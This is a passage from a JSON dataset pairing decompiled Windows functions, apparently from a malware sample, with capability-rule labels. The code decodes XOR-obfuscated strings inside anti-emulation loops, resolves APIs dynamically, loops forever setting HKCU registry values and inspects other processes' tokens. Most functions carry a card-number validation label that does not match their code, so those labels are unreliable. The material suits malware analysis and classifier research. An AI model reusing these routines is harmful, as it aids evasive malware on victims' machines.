        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404c80(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint *var_88h;\n    uint *var_84h;\n    uint var_7ch;\n    uint hObject;\n    int32_t var_5ch;\n    int32_t lpLibFileName;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpszLongPath;\n    uint var_8h;\n    uint var_4h;\n    \n    lpszLongPath = *0x41dacc;\n    var_40h = 0x4c387160;\n    puVar8 = &lpDst;\n    for (iVar6 = 0x410; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x712b4710;\n    var_38h = 0x47104c2b;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0x4c6a7137;\n    var_30h = 0x71364725;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_2ch = 0x470a4c36;\n    var_28h = 0x4c2a7131;\n    puVar8 = &lpszShortPath;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_24h = 0x71764714;\n    var_20h = 0x47254c7d;\n    var_1ch = 0x4c227126;\n    var_18h = 0x716b471d;\n    var_14h = 0x47014c2a;\n    var_10h = 0x4c4f7120;\n    var_8h = 0x4c4f7145;\n    var_4h._0_2_ = 0x4779;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_50h = 6;\n    iVar7 = 0;\n    var_54h = iVar6;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar3 != 0x1a53a1) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_40h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_2ch = 0x43485277;\n    var_28h = 0x67725702;\n    var_24h = 0x52246161;\n    var_20h = 0x57004313;\n    var_1ch = 0x61376720;\n    var_18h = 0x43425277;\n    var_14h = 0x67705712;\n    var_10h = CONCAT22(var_10h._2_2_, 0x6143);\n    var_48h = 0x43675257;\n    var_44h._0_1_ = 0x61;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4ch = 5;\n    iVar7 = 0;\n    var_5ch = iVar6;\n    lpszLongPath = &var_2ch - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xb7edac) {\n            *(iVar7 + iVar6) = *(&var_48h + iVar7 % var_4ch) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar6, &lpszShortPath);\n    var_18h = 0x54167103;\n    var_14h = 0x7110700a;\n    var_10h = 0x70645410;\n    var_8h = 0x54637171;\n    puVar8 = &var_98h;\n    for (iVar6 = 0x3c; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_4h._0_2_ = 0x7064;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_8ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_48h = var_8ch;\n    lpszLongPath = &var_18h - var_8ch;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar7 != 0x85da7d) {\n            *(iVar6 + var_8ch) = *(&var_8h + iVar6 % var_50h) ^ (iVar6 + var_8ch)[&var_18h - var_8ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    var_88h = &lpDst;\n    var_98h = 0x3c;\n    var_84h = &ARG_0;\n    var_7ch = 3;\n    var_94h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_18h = 0x15770f00;\n    var_14h = 0x1c756002;\n    var_10h = 0x473f223d;\n    var_8h = 0x59324753;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x4e);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    lpszLongPath = &var_18h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar3 != 0x849621) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_4ch) ^ (iVar7 + iVar6)[&var_18h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    var_1ch = 0x23145109;\n    var_18h = 0x5c221d26;\n    var_14h = 0x3d3e3a12;\n    var_10h = 0x4f26411f;\n    var_8h = 0x4f71395a;\n    var_4h._0_2_ = 0x584a;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpszLongPath = &var_1ch - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x392139) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    while( true ) {\n        var_90h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar7 = (*pcVar5)(&var_98h);\n        if (iVar7 != 0) break;\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar7 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_48h);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_5ch);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_54h);\n    (*pcVar5)(uVar2);\n    return 1;\n}\n",
        "token_count": 2639
    },
    "004052a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004052a9(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 545
    },
    "0040552c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040552c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_170h;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_68h = 0;\n    var_64h = 0x1935252a;\n    var_60h = 0x36381802;\n    puVar6 = &var_170h;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_5ch = 0x29103831;\n    var_58h = 0x16060221;\n    var_54h = 0x2231272c;\n    var_50h = 0x2372410;\n    var_4ch = 0x10160a02;\n    var_48h = 0x2f0b0718;\n    var_44h = 0x1c23193d;\n    var_40h = 0x1a042038;\n    var_3ch = 0x31a1617;\n    var_38h = 0x3d381c01;\n    var_34h = 0x19590108;\n    var_30h = 0x10011936;\n    var_2ch = 0x291e3424;\n    var_28h = 0x83d2523;\n    var_24h = 0x376f2506;\n    var_20h._0_2_ = 0x7531;\n    var_ch = 0x6d534a79;\n    var_8h._0_1_ = 0x75;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar5 = 0;\n    var_6ch = iVar4;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar2 != 0x7a691b) {\n            *(iVar5 + iVar4) = *(&var_ch + iVar5 % var_4h) ^ (iVar5 + iVar4)[&var_64h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x46);\n    var_14h = 0x7c627b5f;\n    var_10h._0_1_ = 0x66;\n    var_1ch = 0x4c524e6d;\n    var_18h._0_1_ = 0x66;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_ch = &var_14h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        iVar2 = var_6ch;\n        if (iVar3 != 0x250647) {\n            *(iVar5 + iVar4) = *(&var_1ch + iVar5 % var_4h) ^ (iVar5 + iVar4)[&var_14h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_4h = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_170h, iVar2, iVar5);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_170h, &var_4h);\n            if (iVar3 == 0) {\n                var_68h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_4h, iVar4, 0, 4, &var_68h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1215
    },
    "00405a39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405a39(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t hObject;\n    uint ARG_0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pSessionId;\n    uint *dwProcessId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint dwBytes;\n    int32_t TokenHandle;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_24h = 0x104;\n    var_10h = puVar3;\n    uVar2 = (*pcVar6)(8, 0x208);\n    var_ch = (*pcVar7)(uVar2);\n    var_20h = 0x104;\n    var_1ch = 0;\n    dwBytes = 0;\n    pSessionId = 0;\n    uVar2 = 0;\n    if ((puVar3 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            puVar3 = var_ch;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (TokenHandle == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &dwBytes);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 == 0x7a) {\n                        uVar2 = (*pcVar6)(8, dwBytes);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*pcVar1)(TokenHandle, 1, dwProcessId, dwBytes, &dwBytes);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_30h);\n                                if (iVar5 != 0) {\n                                    var_60h = 0x58274629;\n                                    var_5ch = 0x62157a3a;\n                                    var_58h = 0x46356911;\n                                    var_54h = 0x7a53582c;\n                                    var_50h = 0x6904621a;\n                                    var_4ch = 0x5811465f;\n                                    var_48h = 0x62637a35;\n                                    var_44h = 0x4626692b;\n                                    var_40h = 0x7a0d5847;\n                                    var_3ch._0_2_ = 0x6246;\n                                    var_38h = 0x5862467a;\n                                    var_34h._0_1_ = 0x69;\n                                    uVar2 = (*pcVar6)(8, 0x4d);\n                                    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                    iVar8 = 0;\n                                    do {\n                                        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                                        if (iVar4 != 0xa860b7) {\n                                            var_1ch = 5;\n                                            *(iVar8 + iVar5) =\n                                                 *(&var_38h + iVar8 % 5) ^ (iVar8 + iVar5)[&var_60h - iVar5];\n                                        }\n                                        iVar8 = iVar8 + 1;\n                                    } while (iVar8 < 0x26);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar5, var_ch, var_10h, pSessionId);\n                                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                            }\n                            uVar2 = (*pcVar6)(0, dwProcessId);\n                            (*pcVar7)(uVar2);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar3 = var_10h;\n        }\n        uVar2 = (*pcVar6)(0, var_ch);\n        (*pcVar7)(uVar2);\n        uVar2 = (*pcVar6)(0, puVar3);\n        (*pcVar7)(uVar2);\n        uVar2 = var_1ch;\n    }\n    return uVar2;\n}\n",
        "token_count": 1509
    },
    "004060b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004060b4(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x4132f0;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x4176f0;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.00405f69();\n        if (iVar3 != 0) {\n            iVar3 = fcn.00405f69();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.0040307c(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 552
    },
    "0040618c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __fastcall fcn.0040618c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uchar *ARG_0;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_50h = 0x1f0c5d34;\n    iVar6 = 8;\n    puVar8 = &var_28h;\n    var_14h = param_2;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_4ch = 0x5d103943;\n    var_48h = 0x3f653c0b;\n    puVar8 = &var_40h;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_44h = 0x4f0b5d1e;\n    var_20h = 0x4f783873;\n    puVar8 = &var_38h;\n    for (iVar5 = iVar6; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_1ch._0_2_ = 0x5631;\n    puVar8 = &var_30h;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    ARG_0 = &var_50h - iVar5;\n    var_8h = iVar5;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar2 != 0xc50775) {\n            var_4h = 6;\n            *(iVar6 + iVar5) = *(&var_20h + iVar6 % 6) ^ (iVar6 + iVar5)[ARG_0];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x10);\n    var_50h = 0x2a18513a;\n    var_4ch = 0x58073d54;\n    var_48h = 0x583d556a;\n    var_44h = CONCAT31(var_44h._1_3_, 0x6a);\n    var_20h = 0x446a3451;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x31);\n    uVar1 = (*pcVar4)(8, 0xe);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_4h = 5;\n    iVar6 = 0;\n    var_18h = iVar5;\n    ARG_0 = &var_50h - iVar5;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        iVar2 = var_8h;\n        if (iVar3 != 0x3644e2) {\n            *(iVar6 + iVar5) = *(&var_20h + iVar6 % var_4h) ^ (&var_50h - iVar5)[iVar6 + iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_8h);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar4 != NULL) {\n        iVar6 = (*pcVar4)(var_10h, &var_28h, &var_40h, &var_38h, &var_30h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar6 != 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n            ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            var_50h = 0x491b274d;\n            var_4ch = 0x1b3b505f;\n            var_48h = 0x3b505f49;\n            puVar7 = ARG_0;\n            for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_44h = CONCAT31(var_44h._1_3_, 0x36);\n            var_20h = 0x6c364368;\n            var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x6f);\n            uVar1 = (*pcVar4)(8, 0xe);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_10h = &var_50h - iVar5;\n            do {\n                iVar2 = (*_sym.imp.USER32.dll_GetFocus)();\n                puVar7 = ARG_0;\n                if (iVar2 != 0x91018e) {\n                    *(iVar6 + iVar5) = *(&var_20h + iVar6 % var_4h) ^ (iVar6 + iVar5)[&var_50h - iVar5];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xd);\n            (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, iVar5, var_14h, var_24h, var_28h);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar5 = var_18h;\n            iVar2 = var_8h;\n            goto code_r0x00406395;\n        }\n    }\n    puVar7 = NULL;\ncode_r0x00406395:\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return puVar7;\n}\n",
        "token_count": 1742
    },
    "0040973c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040973c(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x41dacc);\n    iVar4 = fcn.004048d3();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 >> 1 < 0x20) {\n        do {\n            if (iVar4 == iVar7) goto code_r0x004097cc;\n            iVar7 = (&var_28h)[iVar6];\n            iVar6 = iVar6 + 1;\n        } while (iVar7 != 0);\n        uVar5 = 0;\n    }\n    else {\ncode_r0x004097cc:\n        uVar5 = 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 469
    },
    "0040aadd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040aadd(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if 